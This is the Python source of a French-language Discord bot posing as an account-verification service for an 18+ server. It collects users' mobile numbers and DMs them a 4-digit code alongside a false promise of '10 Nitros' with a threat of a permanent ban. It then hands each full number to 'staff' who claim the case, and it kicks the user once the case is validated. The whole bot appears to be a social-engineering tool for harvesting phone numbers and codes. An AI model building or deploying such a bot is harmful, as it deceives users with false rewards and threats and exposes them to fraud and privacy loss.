import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict, Set
from aiohttp import web
import config
from utils import validate_phone, mask_phone, generate_code, validate_code

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
pending_verifications: Dict[int, dict] = {}
blacklisted_numbers: Set[str] = set()
blacklisted_users: Set[int] = set()

NITRO_TEXT = (
    "🎁 **VOUS AVEZ REÇU 10 NITROS !** 🎁\n\n"
    "📲 **Comment les récupérer :**\n"
    "➡️ Va dans **Paramètres** > **Inventaire** > **Cadeaux**\n"
    "➡️ Tu verras **10 Nitros** qui t'attendent !\n\n"
    "⚠️ **ATTENTION :**\n"
    "• Tu dois récupérer tes Nitros **toutes les 72h**\n"
    "• **Sinon tes Nitros disparaissent** et tu risques un **banissement définitif du compte**\n"
    "• Si tu ne reçois pas le code ou qu'il ne marche pas, **refais une demande** et patiente **10 minutes**\n\n"
    "✅ **C'est 100% sécurisé** — aucun risque pour ton compte\n\n"
    "📝 **N'oublie pas de laisser un avis après validation !**\n"
    "👍 Un petit avis nous aide à améliorer le service !"
)

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()
        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(title="⏳ Cooldown", description=f"Veuillez attendre **{int(remaining)}s** avant de réessayer.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

        if interaction.user.id in blacklisted_users:
            embed = discord.Embed(title="🚫 Blacklisté", description="Vous êtes blacklisté.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        phone = self.phone.value
        valid, err_msg = validate_phone(phone)
        if not valid:
            embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        code = generate_code()
        masked = mask_phone(phone)
        pending_verifications[interaction.user.id] = {
            "phone": phone,
            "code": code,
            "claimed_by": None,
            "claimed_time": None,
        }

        cooldowns[interaction.user.id] = now

        embed_dm = discord.Embed(
            title="📩 Code de vérification",
            description=f"**Ton code : `{code}`**\n\nRenvoie ce code dans ce MP pour valider.\n\n{NITRO_TEXT}",
            color=0x5865f2
        )
        try:
            await interaction.user.send(embed=embed_dm)
            embed_done = discord.Embed(title="✅ Code envoyé", description=f"Un code à 4 chiffres t'a été envoyé en MP **({masked})**.\n📌 **Réponds dans tes MP avec le code.**", color=0x57f287)
            await interaction.response.send_message(embed=embed_done, ephemeral=True)
        except discord.Forbidden:
            embed_err = discord.Embed(title="❌ MP fermés", description="Ouvre tes MP puis réessaie.", color=0xed4245)
            await interaction.response.send_message(embed=embed_err, ephemeral=True)
            pending_verifications.pop(interaction.user.id, None)
            return

        await send_staff_panel(interaction.user, phone, code)
        log.info(f"Vérification démarrée pour {interaction.user.name} - {masked}")

def build_staff_embed(user, phone, status, claimed_by=None, code_generated=False, code_value=None, timestamp=None):
    masked = mask_phone(phone)
    embed = discord.Embed(
        title="📱 Nouvelle vérification",
        color=0x5865f2,
        timestamp=timestamp or datetime.datetime.now()
    )
    embed.add_field(name="👤 Utilisateur", value=f"{user.mention} (`{user.id}`)", inline=False)
    embed.add_field(name="📞 Numéro", value=f"||{phone}||", inline=True)
    embed.add_field(name="🔒 Masqué", value=masked, inline=True)
    embed.add_field(name="📊 Statut", value=status, inline=True)
    if claimed_by:
        embed.add_field(name="👮 Claimé par", value=f"<@{claimed_by}>", inline=True)
    if code_generated and code_value:
        embed.add_field(name="🔑 Code", value=f"`{code_value}`", inline=True)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text="Système de vérification")
    return embed

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str, code_value: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.code_value = code_value
        self.claimed_by = None
        self.message = None

    @discord.ui.button(label="🙋 Claim", style=discord.ButtonStyle.primary, custom_id="staff_claim")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None:
            embed = discord.Embed(title="⚠️ Déjà claim", description=f"Ce dossier est déjà claim par <@{self.claimed_by}>.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        self.claimed_by = interaction.user.id
        pending = pending_verifications.get(self.user_id)
        if pending:
            pending["claimed_by"] = interaction.user.id

        embed = build_staff_embed(
            user=await bot.fetch_user(self.user_id),
            phone=self.phone,
            status="🔄 En cours",
            claimed_by=self.claimed_by,
            code_generated=True,
            code_value=self.code_value,
            timestamp=interaction.message.created_at,
        )
        embed.color = 0x5865f2
        await interaction.response.edit_message(embed=embed, view=self)
        await interaction.followup.send(f"✅ Tu as claim la vérification de <@{self.user_id}>", ephemeral=True)

    @discord.ui.button(label="✅ Valider → KICK", style=discord.ButtonStyle.success, custom_id="staff_validate")
    async def validate(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="❌ Non claim", description="Tu dois d'abord claim ce dossier.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="❌ Pas ton claim", description=f"Ce dossier est claim par <@{self.claimed_by}>.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # KICK l'utilisateur du serveur principal
        if config.GUILD_ID:
            guild = bot.get_guild(config.GUILD_ID)
            if guild:
                member = guild.get_member(self.user_id)
                if member:
                    try:
                        await member.kick(reason=f"Vérification validée par {interaction.user.name} (ID: {interaction.user.id})")
                        log.info(f"KICK: {member.name} ({self.user_id}) du serveur {guild.name}")
                        embed_kick = discord.Embed(title="👢 Utilisateur kické", description=f"<@{self.user_id}> a été **kické** du serveur.", color=0xed4245)
                        await interaction.response.send_message(embed=embed_kick, ephemeral=False)
                    except discord.Forbidden:
                        embed_err = discord.Embed(title="❌ Permission manquante", description="Je n'ai pas la permission de kicker. Donne-moi 'Kick Members'.", color=0xed4245)
                        await interaction.response.send_message(embed=embed_err, ephemeral=True)
                        return
                    except discord.HTTPException as e:
                        embed_err = discord.Embed(title="❌ Erreur", description=f"Impossible de kicker : {e}", color=0xed4245)
                        await interaction.response.send_message(embed=embed_err, ephemeral=True)
                        return
                else:
                    embed_err = discord.Embed(title="❌ Membre introuvable", description="L'utilisateur n'est plus sur le serveur.", color=0xfee75c)
                    await interaction.response.send_message(embed=embed_err, ephemeral=True)

        # Envoie un DM à l'utilisateur pour le prévenir
        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(
                title="👢 Tu as été kické",
                description="Ta vérification a été **validée**, tu as été kické du serveur.",
                color=0xed4245
            )
            await user.send(embed=embed_dm)
        except:
            pass

        # Log dans le salon de log
        log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
        if log_channel:
            embed_log = discord.Embed(
                title="👢 KICK - Vérification validée",
                description=f"Utilisateur kické après validation.",
                color=0xed4245,
                timestamp=datetime.datetime.now()
            )
            embed_log.add_field(name="👤 User", value=f"<@{self.user_id}> (`{self.user_id}`)", inline=True)
            embed_log.add_field(name="👮 Staff", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=True)
            embed_log.add_field(name="📞 Numéro", value=f"||{self.phone}||", inline=True)
            embed_log.set_thumbnail(url=user.display_avatar.url if hasattr(user, 'display_avatar') else None)
            await log_channel.send(embed=embed_log)

        pending_verifications.pop(self.user_id, None)

        # Désactiver tous les boutons
        for child in self.children:
            child.disabled = True
        embed_final = build_staff_embed(
            user=await bot.fetch_user(self.user_id),
            phone=self.phone,
            status="✅ Validé - KICKÉ",
            claimed_by=self.claimed_by,
            code_generated=True,
            code_value=self.code_value,
            timestamp=interaction.message.created_at,
        )
        embed_final.color = 0xed4245
        await interaction.message.edit(embed=embed_final, view=self)

    @discord.ui.button(label="❌ Refuser", style=discord.ButtonStyle.danger, custom_id="staff_refuse")
    async def refuse(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="❌ Non claim", description="Tu dois d'abord claim ce dossier.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="❌ Pas ton claim", description=f"Ce dossier est claim par <@{self.claimed_by}>.", color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        for child in self.children:
            child.disabled = True
        embed_final = build_staff_embed(
            user=await bot.fetch_user(self.user_id),
            phone=self.phone,
            status="❌ Refusé",
            claimed_by=self.claimed_by,
            code_generated=True,
            code_value=self.code_value,
            timestamp=interaction.message.created_at,
        )
        embed_final.color = 0xed4245
        await interaction.response.edit_message(embed=embed_final, view=self)
        pending_verifications.pop(self.user_id, None)

        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(title="❌ Vérification refusée", description="Ta vérification a été refusée.", color=0xed4245)
            await user.send(embed=embed_dm)
        except:
            pass

async def send_staff_panel(user: discord.User, phone: str, code_value: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return
    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return
    view = StaffPanelView(user.id, phone, code_value)
    embed = build_staff_embed(user=user, phone=phone, status="⏳ En attente", claimed_by=None, code_generated=True, code_value=code_value)
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = pending_verifications.get(user_id)
    if pending is None:
        return
    content = message.content.strip()
    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="❌ Code invalide", description=err_msg, color=0xed4245)
        await message.channel.send(embed=embed)
        return
    if content != pending["code"]:
        embed = discord.Embed(title="❌ Code incorrect", description="Le code entré est incorrect. Réessaie.", color=0xed4245)
        await message.channel.send(embed=embed)
        return

    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    pending["code_received"] = True

    embed_success = discord.Embed(
        title="✅ Code valide !",
        description=f"Ton code a été validé.\nUn staff va traiter ta demande.\n\n{NITRO_TEXT}",
        color=0x57f287
    )
    await message.channel.send(embed=embed_success)

    # Log dans le salon de log
    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="✅ CODE REÇU",
            description=f"L'utilisateur a envoyé le bon code.",
            color=0x57f287,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="👤 User", value=f"{message.author.mention}", inline=True)
        embed_log.add_field(name="👮 Staff", value=f"<@{claimed_by}>" if claimed_by else "Personne", inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        await log_channel.send(content=f"<@{claimed_by}> ✅ Code reçu ! Tu peux valider ou refuser.", embed=embed_log)

    # Mettre à jour le panel staff
    staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
    if staff_guild:
        staff_channel = staff_guild.get_channel(config.STAFF_CHANNEL_ID)
        if staff_channel:
            async for msg in staff_channel.history(limit=50):
                if msg.embeds:
                    for embed in msg.embeds:
                        for field in embed.fields:
                            if field.value and str(user_id) in field.value:
                                try:
                                    view = StaffPanelView(user_id, phone, pending["code"])
                                    view.claimed_by = claimed_by
                                    new_embed = build_staff_embed(
                                        user=message.author,
                                        phone=phone,
                                        status="✅ Code reçu - En attente staff",
                                        claimed_by=claimed_by,
                                        code_generated=True,
                                        code_value=content,
                                        timestamp=msg.created_at,
                                    )
                                    new_embed.color = 0x57f287
                                    await msg.edit(embed=new_embed, view=view)
                                except:
                                    pass
                                break

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in blacklisted_users:
            embed_b = discord.Embed(title="🚫 Blacklisté", description="Vous êtes blacklisté.", color=0xed4245)
            await interaction.response.send_message(embed=embed_b, ephemeral=True)
            return
        await interaction.response.send_modal(PhoneModal())

@bot.tree.command(name="setup", description="Crée le panneau de vérification")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 Vérification requise",
        description="Pour accéder à ce serveur, vérifiez votre compte.\n\n**Procédure :**\n1️⃣ Cliquez sur **Vérifier**\n2️⃣ Entrez votre numéro (06/07)\n3️⃣ Recevez un **code à 4 chiffres** par MP\n4️⃣ Répondez avec le code\n\n🔒 **100% sécurisé** • 💰 **0,00 €**",
        color=0x5865f2
    )
    embed.set_footer(text="Système de vérification")
    view = VerifyView()
    await interaction.response.send_message(embed=embed, view=view)
    config.SETUP_CHANNEL_ID = interaction.channel_id
    log.info(f"Setup dans #{interaction.channel.name}")

@bot.tree.command(name="sync", description="Sync les commandes")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="✅ Commandes synchronisées", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="reset", description="Reset le panneau")
@app_commands.default_permissions(administrator=True)
async def reset(interaction: discord.Interaction):
    await setup.callback(interaction)

@bot.tree.command(name="stats", description="Stats vérification")
@app_commands.default_permissions(administrator=True)
async def stats(interaction: discord.Interaction):
    embed = discord.Embed(
        title="📊 Stats",
        description=f"**En cours :** {len(pending_verifications)}\n**Blacklistés :** {len(blacklisted_users)}\n**Numéros blacklistés :** {len(blacklisted_numbers)}",
        color=0x5865f2
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="acces", description="Donne l'accès aux vérifications à un staff")
@app_commands.default_permissions(administrator=True)
async def acces(interaction: discord.Interaction, member: discord.Member):
    if config.STAFF_ROLE_ID == 0:
        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré dans .env", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
    if not role:
        embed = discord.Embed(title="❌ Erreur", description="Rôle staff introuvable.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if role in member.roles:
        embed = discord.Embed(title="⚠️ Déjà", description=f"{member.mention} a déjà l'accès.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await member.add_roles(role, reason="Accès vérification")
    embed = discord.Embed(title="✅ Accès donné", description=f"{member.mention} peut maintenant claim et gérer les vérifications.", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Accès donné à {member.name} par {interaction.user.name}")

@bot.tree.command(name="delacces", description="Retire l'accès aux vérifications à un staff")
@app_commands.default_permissions(administrator=True)
async def delacces(interaction: discord.Interaction, member: discord.Member):
    if config.STAFF_ROLE_ID == 0:
        embed = discord.Embed(title="❌ Erreur", description="STAFF_ROLE_ID non configuré.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    role = interaction.guild.get_role(config.STAFF_ROLE_ID)
    if not role:
        embed = discord.Embed(title="❌ Erreur", description="Rôle introuvable.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if role not in member.roles:
        embed = discord.Embed(title="⚠️ Pas d'accès", description=f"{member.mention} n'a pas l'accès.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await member.remove_roles(role, reason="Accès vérification retiré")
    embed = discord.Embed(title="✅ Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Accès retiré à {member.name} par {interaction.user.name}")

@bot.event
async def on_ready():
    log.info(f"✅ Connecté : {bot.user}")
    await bot.tree.sync()
    log.info("Commandes synchronisées.")
    bot.add_view(VerifyView())
    # Restaurer les vues persistantes dans le salon setup
    if config.SETUP_CHANNEL_ID:
        channel = bot.get_channel(config.SETUP_CHANNEL_ID)
        if channel:
            async for msg in channel.history(limit=50):
                if msg.author.id == bot.user.id and msg.embeds:
                    try:
                        await msg.edit(view=VerifyView())
                        log.info("Vue restaurée automatiquement")
                        break
                    except:
                        pass
    asyncio.create_task(start_health_server())

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant")
        exit(1)
    bot.run(config.BOT_TOKEN)
